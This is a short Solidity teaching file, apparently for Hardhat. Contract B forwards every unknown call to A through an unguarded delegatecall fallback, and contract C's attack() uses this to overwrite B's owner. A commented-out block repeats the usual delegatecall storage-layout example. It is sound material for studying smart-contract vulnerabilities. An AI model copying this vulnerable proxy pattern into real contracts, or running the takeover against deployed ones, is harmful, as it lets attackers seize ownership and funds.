// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract A {
    address public owner;

    function setOwner() public {
        owner = msg.sender;
        console.log("msg.sender", msg.sender);
    }
}

contract B {
    address public owner;
    A public a;

    constructor(A _a) {
        owner = msg.sender;
        a = A(_a);
    }

    fallback() external payable {
        address(a).delegatecall(msg.data);
    }
}

contract C {
    address public b;

    constructor(address _b) {
        b = _b;
    }

    function attack() public {
        b.call(abi.encodeWithSignature("setOwner()"));
    }
}


// pragma solidity ^0.8.17;

// // NOTE: Deploy this contract first
// contract B {
//     // NOTE: storage layout must be the same as contract A
//     uint public num;
//     address public sender;
//     uint public value;

//     function setVars(uint _num) public payable {
//         num = _num;
//         sender = msg.sender;
//         value = msg.value;
//     }
// }

// contract A {
//     uint public num;
//     address public sender;
//     uint public value;

//     function setVars(address _contract, uint _num) public payable {
//         // A's storage is set, B is not modified.
//         (bool success, bytes memory data) = _contract.delegatecall(
//             abi.encodeWithSignature("setVars(uint256)", _num)
//         );
//     }
// }
